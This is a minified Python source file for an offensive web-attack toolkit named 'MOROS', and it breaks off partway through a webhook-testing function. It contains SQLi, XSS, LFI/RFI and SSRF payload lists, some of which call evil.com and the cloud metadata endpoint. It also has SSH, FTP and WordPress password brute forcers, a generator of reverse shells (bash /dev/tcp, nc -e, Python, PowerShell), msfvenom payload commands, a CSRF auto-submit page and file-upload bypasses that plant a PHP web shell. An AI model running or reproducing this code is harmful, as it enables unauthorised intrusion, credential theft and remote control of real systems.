_A9='[bold cyan]Save to file? (y/n): [/bold cyan]'
_A8='[bold cyan]Enter path to password list: [/bold cyan]'
_A7='[bold cyan]Enter username or path to userlist: [/bold cyan]'
_A6='http://localhost/'
_A5='http://127.0.0.1/'
_A4='http://169.254.169.254/latest/meta-data/'
_A3='<img src=x onerror=alert(1)>'
_A2="<script>alert('XSS')</script>"
_A1='[cyan]Testing payloads...'
_A0='[yellow][*] Returning to main menu...[/yellow]'
_z='start_time'
_y='[red][!] Brute force unsuccessful[/red]'
_x='[cyan]Brute forcing...'
_w='passwords_tested'
_v='usernames_tested'
_u='[red][!] Password file not found![/red]'
_t='response_length'
_s='URL'
_r='root:'
_q='file:///etc/passwd'
_p='[red]Vulnerable[/red]'
_o='high'
_n='html'
_m='txt'
_l='timestamp'
_k='[bold cyan]Enter target URL (with parameter): [/bold cyan]'
_j='status'
_i='back'
_h='details'
_g='blue'
_f='Status'
_e='Type'
_d='tests'
_c='id'
_b='content_length'
_a='[bold cyan]Enter target URL: [/bold cyan]'
_Z='Payload'
_Y='r'
_X='vulnerability'
_W='results'
_V='y'
_U='w'
_T='FUZZ'
_S='findings'
_R='tested_payloads'
_Q='attempts'
_P='password'
_O='username'
_N='test_errors'
_M='vulnerabilities_found'
_L=False
_K='success'
_J='type'
_I=True
_H='vulnerable'
_G='status_code'
_F='url'
_E='error'
_D='green'
_C='cyan'
_B='target'
_A='payload'
from fake_useragent import UserAgent
from rich.console import Console
from rich.align import Align
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.progress import Progress
from queue import Queue
import subprocess,dns.resolver,requests,threading,time,os,random,asyncio,aiohttp,paramiko,ftplib
from bs4 import BeautifulSoup
import mimetypes,json,csv,socket,xml.etree.ElementTree as ET
from datetime import datetime
import hashlib,zipfile,tarfile,shutil,re
console=Console()
class Logger:
	def __init__(A):A.log_dir='logs';os.makedirs(A.log_dir,exist_ok=_I);A.log_file=os.path.join(A.log_dir,f"scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json");A.scan_data={_z:datetime.now().isoformat(),'targets':[],_S:[]}
	def log_finding(A,target,vulnerability,details):
		B={_l:datetime.now().isoformat(),_B:target,_X:vulnerability,_h:details};A.scan_data[_S].append(B)
		with open(A.log_file,_U)as C:json.dump(A.scan_data,C,indent=2)
	def generate_report(C,format=_m):
		I='low';H='critical';D=C.log_file.replace('.json',f".{format}")
		if format==_m:
			with open(D,_U)as B:
				B.write(f"MOROS Scan Report\n{'='*20}\n");B.write(f"Start Time: {C.scan_data[_z]}\n");B.write(f"End Time: {datetime.now().isoformat()}\n\n");B.write('Findings:\n')
				for(F,A)in enumerate(C.scan_data[_S],1):B.write(f"{F}. Target: {A[_B]}\n");B.write(f"   Vulnerability: {A[_X]}\n");B.write(f"   Details: {A[_h]}\n\n")
		elif format=='csv':
			with open(D,_U,newline='')as B:
				G=csv.writer(B);G.writerow(['Timestamp','Target','Vulnerability','Details'])
				for A in C.scan_data[_S]:G.writerow([A[_l],A[_B],A[_X],str(A[_h])])
		elif format==_n:
			with open(D,_U)as B:
				B.write('\n<!DOCTYPE html>\n<html>\n<head>\n    <title>MOROS Scan Report</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 20px; }\n        h1 { color: #d9534f; }\n        .finding { border: 1px solid #ddd; padding: 15px; margin-bottom: 10px; border-radius: 5px; }\n        .critical { background-color: #f2dede; }\n        .high { background-color: #fcf8e3; }\n        .medium { background-color: #d9edf7; }\n        .low { background-color: #dff0d8; }\n    </style>\n</head>\n<body>\n    <h1>MOROS Scan Report</h1>\n                ');B.write(f"<p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>");B.write(f"<p><strong>Findings:</strong> {len(C.scan_data[_S])}</p><hr>")
				for(F,A)in enumerate(C.scan_data[_S],1):
					E='medium'
					if H in A[_X].lower():E=H
					elif _o in A[_X].lower():E=_o
					elif I in A[_X].lower():E=I
					B.write(f'''
<div class="finding {E}">
    <h3>Finding #{F}: {A[_X]}</h3>
    <p><strong>Target:</strong> {A[_B]}</p>
    <p><strong>Timestamp:</strong> {A[_l]}</p>
    <pre>{A[_h]}</pre>
</div>
                    ''')
				B.write('</body></html>')
		console.print(f"[green][+] Report generated: {D}[/green]");return D
logger=Logger()
def clear_screen():os.system('cls'if os.name=='nt'else'clear')
def ip_info_scanner():
	while _I:
		B=Prompt.ask("Enter IP Address (or 'back' to return)",default=_i)
		if B.lower()==_i:console.print(_A0);break
		try:
			with Progress()as D:G=D.add_task('[cyan]Fetching IP info...',total=1);H=requests.get(f"http://ip-api.com/json/{B}",timeout=10);A=H.json();D.update(G,advance=1)
			if A[_j]==_K:
				C=Table(title='IP Details',show_header=_I,header_style='bold magenta');C.add_column('Property',style=_C,width=20);C.add_column('Value',style=_D);E={'Target IP':A['query'],'Country':A['country'],'Country Code':A['countryCode'],'City':A['city'],'Timezone':A['timezone'],'Region':A['regionName'],'ZIP':A['zip'],'Latitude':A['lat'],'Longitude':A['lon'],'ISP':A['isp'],'Organization':A['org'],'AS':A['as']}
				for(I,J)in E.items():C.add_row(I,str(J))
				console.print(C);logger.log_finding(B,'IP Info Scan',E)
			else:console.print(f"[red][!] Error: {A.get('message','Unknown error')}[/red]")
		except Exception as F:console.print(f"[red][!] Error: {F}[/red]");logger.log_finding(B,'IP Scan Error',str(F))
def domain_lookup():
	G='dns';C='whois';B=Prompt.ask("[bold cyan]Enter Domain (or 'back' to return)[/bold cyan]",default=_i)
	if B.lower()==_i:console.print(_A0);return
	console.print(f"[yellow][*] Querying {B}...[/yellow]");A={};D={'domain':B}
	try:
		with Progress()as E:I=E.add_task('[cyan]Querying DNS records...',total=1);K=dns.resolver.resolve(B,'A');A[G]=[str(A)for A in K];D['dns_records']=A[G];E.update(I,advance=1)
	except Exception as F:A[G]=f"[red]Error:[/red] {F}";D['dns_error']=str(F)
	try:
		with Progress()as E:I=E.add_task('[cyan]Fetching WHOIS data...',total=1);L=requests.get(f"https://api.whois.vu/?q={B}",timeout=10);A[C]=L.json();D[C]=A[C];E.update(I,advance=1)
	except Exception as F:A[C]=f"[red]Error:[/red] {F}";D['whois_error']=str(F)
	if isinstance(A.get(G),list):
		J=Table(title=f"[bold cyan]{B} DNS Records[/bold cyan]");J.add_column('IP Address',style=_D)
		for M in A[G]:J.add_row(M)
		console.print(J)
	if isinstance(A.get(C),dict):
		H=Table(title=f"[bold cyan]{B} WHOIS Data[/bold cyan]");H.add_column('Field',style=_C);H.add_column('Value',style=_D)
		for(N,O)in A[C].items():H.add_row(N,str(O))
		console.print(H)
	logger.log_finding(B,'Domain Lookup',D)
def sqli_scanner():
	Q='Blind';P='Time-Based';O='Error-Based';A=Prompt.ask('[bold cyan]Enter target URL (e.g., http://site.com/page?id=): [/bold cyan]')
	if not A:console.print('[red][!] No URL provided![/red]');return
	I=["'",'"','1=1',"' OR 1=1 --",'" OR 1=1 --',"' UNION SELECT 1,2,3 --",'" UNION SELECT 1,2,3 --',"' AND SLEEP(5) --",'" AND SLEEP(5) --'];C=[];D={_B:A,_R:[],_M:[]};console.print(f"\n[yellow][*] Scanning {A} for SQLi...[/yellow]")
	with Progress()as J:
		R=J.add_task(_A1,total=len(I))
		for E in I:
			F=f"{A}{E}";D[_R].append(E)
			try:
				K=time.time();G=requests.get(F,timeout=5);L=time.time();M=G.text.lower();B=None
				if'sql syntax'in M or'mysql_fetch'in M:B=O,E;C.append((F,O))
				elif L-K>4:B=P,E;C.append((F,P))
				elif G.status_code==200 and len(G.text)!=len(requests.get(A,timeout=5).text):B=Q,E;C.append((F,Q))
				if B:D[_M].append({_J:B[0],_A:B[1],_F:F,'response_time':L-K,_G:G.status_code})
			except Exception as S:D[_N]=D.get(_N,[])+[str(S)]
			J.update(R,advance=1)
	if C:
		H=Table(title=f"[bold red]SQLi Vulnerabilities Found![/bold red]");H.add_column(_Z,style=_C);H.add_column(_e,style=_D)
		for N in C:H.add_row(N[0],N[1])
		console.print(H)
	else:console.print(f"[green][+] No SQLi vulnerabilities found[/green]")
	logger.log_finding(A,'SQLi Scan',D)
def xss_scanner():
	B=Prompt.ask(_k);G=[_A2,_A3,'"><script>alert(1)</script>','javascript:alert(1)','onmouseover=alert(1)'];console.print(f"[yellow][*] Scanning {B} for XSS...[/yellow]");C=[];D={_B:B,_R:[],_M:[]}
	with Progress()as H:
		L=H.add_task('[cyan]Testing XSS payloads...',total=len(G))
		for A in G:
			F=B.replace(_T,A)if _T in B else f"{B}{A}";D[_R].append(A)
			try:
				I=requests.get(F,timeout=5)
				if A in I.text:C.append({_A:A,_H:_I,_F:F});D[_M].append({_A:A,_F:F,_G:I.status_code})
				else:C.append({_A:A,_H:_L})
			except Exception as J:C.append({_A:A,_E:str(J)});D[_N]=D.get(_N,[])+[str(J)]
			H.update(L,advance=1)
	if any(A.get(_H)for A in C):
		E=Table(title='[bold red]XSS Vulnerabilities Found![/bold red]');E.add_column(_Z,style=_C);E.add_column(_f,style=_D)
		for K in C:
			if K.get(_H):E.add_row(K[_A],_p)
		console.print(E)
	else:console.print('[green][+] No XSS vulnerabilities found[/green]')
	logger.log_finding(B,'XSS Scan',D)
def rfi_lfi_scanner():
	J='RFI';I='LFI';B=Prompt.ask(_k);M=['../../../../etc/passwd','../../../../etc/hosts','../../../../windows/win.ini',_q];N=['http://evil.com/shell.txt','\\\\evil.com\\share\\shell.txt'];console.print(f"[yellow][*] Scanning {B} for LFI/RFI...[/yellow]");D=[];C={_B:B,_R:[],_M:[]}
	with Progress()as K:
		O=K.add_task('[cyan]Testing LFI/RFI payloads...',total=len(M)+len(N))
		for A in M:
			E=B.replace(_T,A)if _T in B else f"{B}{A}";C[_R].append({_J:I,_A:A})
			try:
				F=requests.get(E,timeout=5)
				if _r in F.text or'[extensions]'in F.text:D.append({_J:I,_A:A,_H:_I,_F:E});C[_M].append({_J:I,_A:A,_F:E,_G:F.status_code})
				else:D.append({_J:I,_A:A,_H:_L})
			except Exception as G:D.append({_J:I,_A:A,_E:str(G)});C[_N]=C.get(_N,[])+[str(G)]
			K.update(O,advance=1)
		for A in N:
			E=B.replace(_T,A)if _T in B else f"{B}{A}";C[_R].append({_J:J,_A:A})
			try:
				F=requests.get(E,timeout=5)
				if F.status_code==200 and len(F.text)>100:D.append({_J:J,_A:A,_H:_I,_F:E});C[_M].append({_J:J,_A:A,_F:E,_G:F.status_code})
				else:D.append({_J:J,_A:A,_H:_L})
			except Exception as G:D.append({_J:J,_A:A,_E:str(G)});C[_N]=C.get(_N,[])+[str(G)]
			K.update(O,advance=1)
	P=[A for A in D if A.get(_H)]
	if P:
		H=Table(title='[bold red]LFI/RFI Vulnerabilities Found![/bold red]');H.add_column(_e,style=_C);H.add_column(_Z,style=_D);H.add_column(_s,style=_g)
		for L in P:H.add_row(L[_J],L[_A],L[_F])
		console.print(H)
	else:console.print('[green][+] No LFI/RFI vulnerabilities found[/green]')
	logger.log_finding(B,'LFI/RFI Scan',C)
def dir_fuzz():
	L='directories_found';A=Prompt.ask(_a).rstrip('/');I=Prompt.ask('[bold cyan]Wordlist path (default: common.txt): [/bold cyan]',default='common.txt')
	try:
		with open(I,_Y)as M:B=[A.strip()for A in M.readlines()]
	except FileNotFoundError:console.print('[red][!] Wordlist file not found![/red]');return
	console.print(f"[yellow][*] Scanning {A} for directories...[/yellow]");console.print(f"[yellow][*] Testing {len(B)} directories...[/yellow]");C=[];J={_B:A,'wordlist':I,'directories_tested':len(B),L:[]}
	with Progress()as D:
		K=D.add_task('[cyan]Scanning directories...',total=len(B))
		for E in B:
			try:
				F=f"{A}/{E}";G=requests.get(F,timeout=3)
				if G.status_code==200:C.append(F);J[L].append({_F:F,_G:G.status_code,_b:len(G.text)})
				D.update(K,advance=1)
			except:D.update(K,advance=1);continue
	if C:
		H=Table(title='[bold green]Found Directories[/bold green]');H.add_column('Directory',style=_C)
		for E in C:H.add_row(E)
		console.print(H)
	else:console.print('[red][!] No directories found[/red]')
	logger.log_finding(A,'Directory Fuzzing',J)
def ssrf_scanner():
	B=Prompt.ask(_k);H=[_A4,_A5,_A6,_q];console.print(f"[yellow][*] Scanning {B} for SSRF...[/yellow]");E=[];C={_B:B,_R:[],_M:[]}
	with Progress()as I:
		M=I.add_task('[cyan]Testing SSRF payloads...',total=len(H))
		for A in H:
			G=B.replace(_T,A)if _T in B else f"{B}{A}";C[_R].append(A)
			try:
				D=requests.get(G,timeout=5)
				if'Amazon'in D.text or _r in D.text or'localhost'in D.text:E.append({_A:A,_H:_I,_F:G});C[_M].append({_A:A,_F:G,_G:D.status_code,_t:len(D.text)})
				else:E.append({_A:A,_H:_L})
			except Exception as J:E.append({_A:A,_E:str(J)});C[_N]=C.get(_N,[])+[str(J)]
			I.update(M,advance=1)
	K=[A for A in E if A.get(_H)]
	if K:
		F=Table(title='[bold red]SSRF Vulnerabilities Found![/bold red]');F.add_column(_Z,style=_C);F.add_column(_s,style=_D)
		for L in K:F.add_row(L[_A],L[_F])
		console.print(F)
	else:console.print('[green][+] No SSRF vulnerabilities found[/green]')
	logger.log_finding(B,'SSRF Scan',C)
def brute_force_menu():
	while _I:
		clear_screen();console.print(Panel('\n[bold cyan][1][/bold cyan] SSH Brute Force\n[bold cyan][2][/bold cyan] FTP Brute Force\n[bold cyan][3][/bold cyan] Return to Main Menu\n',title='[red]Brute Force Options[/red]'));A=Prompt.ask('[bold red]Select an option[/bold red]',choices=['1','2','3'],default='3')
		if A=='1':ssh_brute_force()
		elif A=='2':ftp_brute_force()
		elif A=='3':break
def ssh_brute_force():
	C=Prompt.ask('[bold cyan]Enter SSH host: [/bold cyan]');F=Prompt.ask('[bold cyan]Enter SSH port (default: 22): [/bold cyan]',default='22');G=Prompt.ask(_A7);N=Prompt.ask(_A8)
	if os.path.isfile(G):
		with open(G,_Y)as H:D=[A.strip()for A in H.readlines()]
	else:D=[G]
	try:
		with open(N,_Y)as H:E=[A.strip()for A in H.readlines()]
	except FileNotFoundError:console.print(_u);return
	console.print(f"[yellow][*] Starting SSH brute force on {C}:{F}...[/yellow]");console.print(f"[yellow][*] Testing {len(D)} users with {len(E)} passwords...[/yellow]");K=[];I={_B:f"{C}:{F}",_v:len(D),_w:len(E),_Q:[]}
	with Progress()as L:
		O=L.add_task(_x,total=len(D)*len(E))
		for A in D:
			for B in E:
				try:J=paramiko.SSHClient();J.set_missing_host_key_policy(paramiko.AutoAddPolicy());J.connect(C,port=int(F),username=A,password=B,timeout=5);console.print(f"[green][+] Success: {A}:{B}[/green]");K.append({_O:A,_P:B,_K:_I});I[_Q].append({_O:A,_P:B,_K:_I});J.close();logger.log_finding(C,'SSH Brute Force Success',{_O:A,_P:B});return
				except Exception as M:K.append({_O:A,_P:B,_K:_L,_E:str(M)});I[_Q].append({_O:A,_P:B,_K:_L,_E:str(M)})
				L.update(O,advance=1)
	console.print(_y);logger.log_finding(C,'SSH Brute Force Results',I)
def ftp_brute_force():
	C=Prompt.ask('[bold cyan]Enter FTP host: [/bold cyan]');F=Prompt.ask('[bold cyan]Enter FTP port (default: 21): [/bold cyan]',default='21');G=Prompt.ask(_A7);N=Prompt.ask(_A8)
	if os.path.isfile(G):
		with open(G,_Y)as H:D=[A.strip()for A in H.readlines()]
	else:D=[G]
	try:
		with open(N,_Y)as H:E=[A.strip()for A in H.readlines()]
	except FileNotFoundError:console.print(_u);return
	console.print(f"[yellow][*] Starting FTP brute force on {C}:{F}...[/yellow]");console.print(f"[yellow][*] Testing {len(D)} users with {len(E)} passwords...[/yellow]");K=[];I={_B:f"{C}:{F}",_v:len(D),_w:len(E),_Q:[]}
	with Progress()as L:
		O=L.add_task(_x,total=len(D)*len(E))
		for A in D:
			for B in E:
				try:J=ftplib.FTP();J.connect(C,int(F),timeout=5);J.login(A,B);console.print(f"[green][+] Success: {A}:{B}[/green]");K.append({_O:A,_P:B,_K:_I});I[_Q].append({_O:A,_P:B,_K:_I});J.quit();logger.log_finding(C,'FTP Brute Force Success',{_O:A,_P:B});return
				except Exception as M:K.append({_O:A,_P:B,_K:_L,_E:str(M)});I[_Q].append({_O:A,_P:B,_K:_L,_E:str(M)})
				L.update(O,advance=1)
	console.print(_y);logger.log_finding(C,'FTP Brute Force Results',I)
def idor_tester():
	E=Prompt.ask('[bold cyan]Enter base URL (e.g., http://site.com/profile?id=): [/bold cyan]');F=int(Prompt.ask('[bold cyan]Enter starting ID: [/bold cyan]',default='1'));G=int(Prompt.ask('[bold cyan]Enter ending ID: [/bold cyan]',default='10'));console.print(f"[yellow][*] Testing IDOR from ID {F} to {G}...[/yellow]");K=[];B={_B:E,'id_range':f"{F}-{G}",_M:[]}
	with Progress()as I:
		L=I.add_task('[cyan]Testing IDs...',total=G-F+1)
		for D in range(F,G+1):
			J=f"{E}{D}"
			try:
				A=requests.get(J,timeout=5)
				if A.status_code==200 and len(A.text)>0:
					K.append({_c:D,_F:J,_G:A.status_code,_b:len(A.text)})
					if D!=1:
						M=requests.get(f"{E}1",timeout=5)
						if len(A.text)!=len(M.text):B[_M].append({_c:D,_F:J,_G:A.status_code,_b:len(A.text),'difference':len(A.text)-len(M.text)})
				I.update(L,advance=1)
			except Exception as N:K.append({_c:D,_E:str(N)});B[_N]=B.get(_N,[])+[str(N)];I.update(L,advance=1)
	if B[_M]:
		C=Table(title='[bold red]Possible IDOR Vulnerabilities Found![/bold red]');C.add_column('ID',style=_C);C.add_column(_s,style=_D);C.add_column(_f,style=_g);C.add_column('Length',style='yellow')
		for H in B[_M]:C.add_row(str(H[_c]),H[_F],str(H[_G]),str(H[_b]))
		console.print(C)
	else:console.print('[green][+] No obvious IDOR vulnerabilities found[/green]')
	logger.log_finding(E,'IDOR Test',B)
def reverse_shell_generator():
	A=Prompt.ask('[bold cyan]Enter your LHOST: [/bold cyan]');B=Prompt.ask('[bold cyan]Enter your LPORT: [/bold cyan]',default='4444');D={'Bash':f"bash -i >& /dev/tcp/{A}/{B} 0>&1",'Python':f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{A}",{B}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'','PHP':f'php -r \'$sock=fsockopen("{A}",{B});exec("/bin/sh -i <&3 >&3 2>&3");\'','Netcat':f"nc -e /bin/sh {A} {B}",'PowerShell':f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{A}',{B});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\""};C=Table(title='[bold cyan]Reverse Shell Commands[/bold cyan]');C.add_column(_e,style=_C);C.add_column('Command',style=_D)
	for(E,F)in D.items():C.add_row(E,F)
	console.print(C);H=Prompt.ask(_A9,choices=[_V,'n'],default='n')
	if H==_V:
		G=f"reverse_shells_{A}_{B}.txt"
		with open(G,_U)as I:
			for(E,F)in D.items():I.write(f"{E}:\n{F}\n\n")
		console.print(f"[green][+] Saved to {G}[/green]")
	logger.log_finding('Reverse Shell Generator','Generated Shells',{'lhost':A,'lport':B,'shells':list(D.keys())})
def payload_generator():
	K='Bind Shell';J='android';I='web';H='linux';F='windows';A=Prompt.ask('[bold cyan]Select payload type: [/bold cyan]',choices=[F,H,I,J],default=F);C={F:{'Meterpreter Reverse TCP':'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe',K:'msfvenom -p windows/shell_bind_tcp LPORT=<PORT> -f exe > shell.exe','HTA':'msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell.hta'},H:{'Reverse TCP':'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf',K:'msfvenom -p linux/x86/shell_bind_tcp LPORT=<PORT> -f elf > shell.elf'},I:{'PHP Reverse Shell':'msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php','JSP Reverse Shell':'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp','WAR':'msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war'},J:{'APK':'msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -o shell.apk'}};B=Table(title=f"[bold cyan]{A.capitalize()} Payloads[/bold cyan]");B.add_column('Name',style=_C);B.add_column('Command',style=_D)
	for(D,E)in C[A].items():B.add_row(D,E)
	console.print(B);L=Prompt.ask(_A9,choices=[_V,'n'],default='n')
	if L==_V:
		G=f"{A}_payloads.txt"
		with open(G,_U)as M:
			for(D,E)in C[A].items():M.write(f"{D}:\n{E}\n\n")
		console.print(f"[green][+] Saved to {G}[/green]")
	logger.log_finding('Payload Generator','Generated Payloads',{_J:A,'payloads':list(C[A].keys())})
def cms_scanner():
	A=Prompt.ask(_a).rstrip('/');F={'WordPress':['/wp-content/','/wp-includes/','wp-json'],'Joomla':['/media/com_','/components/com_','index.php?option=com_'],'Drupal':['/sites/default/','/core/misc/drupal.js','/?q=user/password'],'Magento':['/skin/frontend/','/js/mage/','/media/catalog/product']};console.print(f"[yellow][*] Scanning {A} for CMS...[/yellow]");H={};I={_B:A,_d:[]}
	with Progress()as J:
		M=J.add_task('[cyan]Checking CMS signatures...',total=len(F))
		for(B,N)in F.items():
			K=_L
			for D in N:
				try:
					L=f"{A}{D}"if D.startswith('/')else f"{A}/{D}";G=requests.get(L,timeout=5);I[_d].append({'cms':B,'signature':D,_F:L,_G:G.status_code,_b:len(G.text)})
					if G.status_code==200:K=_I;break
				except:continue
			H[B]=K;J.update(M,advance=1)
	E=[A for(A,B)in H.items()if B]
	if E:
		C=Table(title='[bold green]CMS Detection Results[/bold green]');C.add_column('CMS',style=_C);C.add_column('Detected',style=_D)
		for B in E:C.add_row(B,'[green]Yes[/green]')
		for B in[A for A in F if A not in E]:C.add_row(B,'[red]No[/red]')
		console.print(C)
	else:console.print('[red][!] No known CMS detected[/red]')
	logger.log_finding(A,'CMS Detection',{_B:A,'detected_cms':E,_d:I[_d]})
def backup_file_finder():
	K='files_found';A=Prompt.ask(_a).rstrip('/');G=['.bak','.backup','.old','.orig','.save','.swp','.tmp','.temp','.zip','.tar','.tar.gz','.rar'];H=['index.php','config.php','settings.php','.env','wp-config.php','configuration.php'];console.print(f"[yellow][*] Searching for backup files on {A}...[/yellow]");B=[];I={_B:A,K:[]}
	with Progress()as J:
		L=J.add_task('[cyan]Checking for backup files...',total=len(H)*len(G))
		for C in H:
			for M in G:
				D=f"{A}/{C}{M}"
				try:
					E=requests.get(D,timeout=3)
					if E.status_code==200:B.append(D);I[K].append({_F:D,_G:E.status_code,_b:len(E.text)})
				except:pass
				J.update(L,advance=1)
	if B:
		F=Table(title='[bold red]Found Backup Files[/bold red]');F.add_column('File',style=_C)
		for C in B:F.add_row(C)
		console.print(F)
	else:console.print('[green][+] No backup files found[/green]')
	logger.log_finding(A,'Backup File Finder',I)
def php_code_injection():
	B=Prompt.ask(_k);H=["system('id');","echo shell_exec('whoami');",'phpinfo();',"eval($_GET['cmd']);"];console.print(f"[yellow][*] Testing {B} for PHP injection...[/yellow]");D=[];E={_B:B,_R:[],_M:[]}
	with Progress()as I:
		L=I.add_task(_A1,total=len(H))
		for A in H:
			G=B.replace(_T,A)if _T in B else f"{B}{A}";E[_R].append(A)
			try:
				C=requests.get(G,timeout=5)
				if'uid='in C.text or'whoami'in C.text or'phpinfo()'in C.text:D.append({_A:A,_H:_I,_F:G});E[_M].append({_A:A,_F:G,_G:C.status_code,'response':C.text[:100]+'...'if C.text else'Empty'})
				else:D.append({_A:A,_H:_L})
			except Exception as J:D.append({_A:A,_E:str(J)});E[_N]=E.get(_N,[])+[str(J)]
			I.update(L,advance=1)
	if any(A.get(_H)for A in D):
		F=Table(title='[bold red]PHP Injection Vulnerabilities Found![/bold red]');F.add_column(_Z,style=_C);F.add_column(_f,style=_D)
		for K in D:
			if K.get(_H):F.add_row(K[_A],_p)
		console.print(F)
	else:console.print('[green][+] No PHP injection vulnerabilities found[/green]')
	logger.log_finding(B,'PHP Injection Test',E)
def csrf_exploiter():
	A=Prompt.ask(_a);C=Prompt.ask('[bold cyan]Enter parameters (key=value&key2=value2): [/bold cyan]');D=f'''
<html>
  <body>
    <form action="{A}" method="POST">
      {"".join(f'<input type="hidden" name="{A}" value="{B}">'for(A,B)in[A.split("=")for A in C.split("&")])}
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
    ''';B='csrf_poc.html'
	with open(B,_U)as E:E.write(D)
	console.print(f"[green][+] CSRF POC created: {B}[/green]");logger.log_finding(A,'CSRF Exploit POC',{_B:A,'parameters':C,'poc_file':B})
def file_upload_bypass():
	J="<?php system($_GET['cmd']); ?>";I='image/jpeg';E='filename';D=Prompt.ask(_a);K=Prompt.ask('[bold cyan]Enter file parameter name: [/bold cyan]');L=[('shell.php.jpg',I,J),('shell.php%00.jpg',I,J),('shell.php ',I,J),('.htaccess','text/plain','AddType application/x-httpd-php .jpg'),('shell.png','image/png',b"\x89PNG\r\n\x1a\n<?php system($_GET['cmd']); ?>")];F=[];G={_B:D,'file_param':K,_Q:[]};console.print(f"[yellow][*] Testing file upload bypasses on {D}...[/yellow]")
	with Progress()as M:
		P=M.add_task('[cyan]Testing bypass methods...',total=len(L))
		for(B,N,Q)in L:
			try:
				R={K:(B,Q,N)};H=requests.post(D,files=R);A={E:B,'content_type':N,_G:H.status_code,_t:len(H.text),_K:_L}
				if H.status_code==200:console.print(f"[yellow][?] {B} uploaded, check manually[/yellow]");A[_K]=_I
				F.append(A);G[_Q].append(A)
			except Exception as O:F.append({E:B,_E:str(O),_K:_L});G[_Q].append({E:B,_E:str(O),_K:_L})
			M.update(P,advance=1)
	C=Table(title='File Upload Bypass Results');C.add_column('Filename',style=_C);C.add_column(_f,style=_D);C.add_column('HTTP Code',style=_g)
	for A in F:S='[green]Success[/green]'if A.get(_K)else'[red]Failed[/red]';C.add_row(A[E],S,str(A.get(_G,'N/A')))
	console.print(C);logger.log_finding(D,'File Upload Bypass Attempt',G)
def wp_brute_force():
	P='wp-admin';A=Prompt.ask('[bold cyan]Enter WordPress site URL: [/bold cyan]');H=Prompt.ask('[bold cyan]Enter username or userlist path: [/bold cyan]');Q=Prompt.ask('[bold cyan]Enter password list path: [/bold cyan]')
	if os.path.isfile(H):
		with open(H,_Y)as I:B=[A.strip()for A in I.readlines()]
	else:B=[H]
	try:
		with open(Q,_Y)as I:F=[A.strip()for A in I.readlines()]
	except FileNotFoundError:console.print(_u);return
	console.print(f"[yellow][*] Starting WordPress brute force on {A}...[/yellow]");console.print(f"[yellow][*] Testing {len(B)} users with {len(F)} passwords...[/yellow]");M=f"{A.rstrip('/')}/wp-login.php";J=[];K={_B:A,_v:len(B),_w:len(F),_Q:[]}
	with Progress()as N:
		R=N.add_task(_x,total=len(B)*len(F))
		for C in B:
			for D in F:
				try:
					L=requests.Session();G=L.get(M);S={'log':C,'pwd':D,'wp-submit':'Log In','redirect_to':f"{A.rstrip('/')}/wp-admin/",'testcookie':'1'};G=L.post(M,data=S);E={_O:C,_P:D,_G:G.status_code,_K:_L}
					if any(P in A.url for A in G.history)or P in G.url:E[_K]=_I;console.print(f"[green][+] Success: {C}:{D}[/green]");J.append(E);L.close();logger.log_finding(A,'WordPress Brute Force Success',E);return
					J.append(E);K[_Q].append(E)
				except Exception as O:J.append({_O:C,_P:D,_E:str(O),_K:_L});K[_Q].append({_O:C,_P:D,_E:str(O),_K:_L})
				N.update(R,advance=1)
	console.print(_y);logger.log_finding(A,'WordPress Brute Force Results',K)
def detect_waf():
	H='detected';G='waf';B=Prompt.ask(_a);console.print(f"[yellow][*] Detecting WAF on {B}...[/yellow]");E={'Cloudflare':['cloudflare','cf-ray'],'Akamai':['akamai','akamaighost'],'Imperva':['imperva','incapsula'],'AWS WAF':['aws','awselb/2.0'],'ModSecurity':['mod_security','libmodsecurity']};I=[];J={_B:B,_d:[]}
	with Progress()as K:
		N=K.add_task('[cyan]Testing WAF signatures...',total=len(E))
		try:
			L=requests.get(B,timeout=5)
			for(A,O)in E.items():
				D=_L
				for P in O:
					for(R,Q)in L.headers.items():
						if P.lower()in Q.lower():D=_I;break
					if D:break
				I.append({G:A,H:D});J[_d].append({G:A,H:D,_G:L.status_code});K.update(N,advance=1)
		except Exception as M:console.print(f"[red][!] Error: {M}[/red]");logger.log_finding(B,'WAF Detection Error',str(M));return
	F=[A[G]for A in I if A[H]]
	if F:
		C=Table(title='[bold red]WAF Detection Results[/bold red]');C.add_column('WAF',style=_C);C.add_column('Detected',style=_D)
		for A in F:C.add_row(A,'[red]Yes[/red]')
		for A in[A for A in E if A not in F]:C.add_row(A,'[green]No[/green]')
		console.print(C)
	else:console.print('[green][+] No known WAF detected[/green]')
	logger.log_finding(B,'WAF Detection',J)
def webhook_exploiter():
	O='xss';N='ssrf';F=Prompt.ask('[bold cyan]Enter webhook URL: [/bold cyan]');I=Prompt.ask('[bold cyan]Test type (ssrf/xss/custom): [/bold cyan]',choices=[N,O,'custom']);console.print(f"[yellow][*] Testing webhook at {F}...[/yellow]");D=[];E={'webhook_url':F,'test_type':I,_W:[]}
	if I==N:
